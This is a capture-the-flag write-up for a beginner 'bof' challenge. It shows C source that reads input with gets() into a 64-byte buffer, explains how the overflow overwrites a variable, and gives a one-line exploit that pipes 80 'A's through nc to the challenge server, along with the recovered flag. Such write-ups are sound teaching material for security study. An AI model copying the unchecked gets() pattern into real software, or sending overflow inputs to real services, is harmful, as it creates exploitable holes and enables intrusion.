## bof 
> What's a buffer? Hmmmmmm... Is my buffer too small?
We're given both the binary and the source, so we take a look at the source first to figure out what's going on.
```
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[64];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("\n\n\n\nMinecraftcito\nWhere you need to survive all day and all night\nCraft a diamond sword so you can fight\nPlace a torch in a cave to produce some light\nMinecraftcito\n");
  puts("What song do you want me to sing next?\n");
  
  gets(name);
  printf("Sorry, I don't know how to sing that...\n");
  if(code != 0) {
    system("cat flag.txt");
     printf("\n\n\n");
  }
}

```

This is a simple buffer overflow. `name` is stored as a char array with length 64. The gets() method assigns user input to name without sanitizing the input to check if it's valid. This means that if we type in something that's longer than the length of 64, it will start overwriting parts of the memory. In this case, since the program checks if the value of `code` is not equal to 0, we only need to rewrite the value of `code`. Putting in at least 73 `a`'s should be sufficient (64 for the buffer, 8 more to overwrite `code` plus 1), but you can put in anything above that to trigger the flag. 

testing:
```
$ chmod +x bof
$ python -c "print 'A'*80" > temp
$ ./bof < temp
```


exploit:
```
$ python -c "print 'A'*80" | nc imaginary.ml 10002

Flag: `flag{buff3r_0v3rfl0w_1s_d4ng3r0uS}`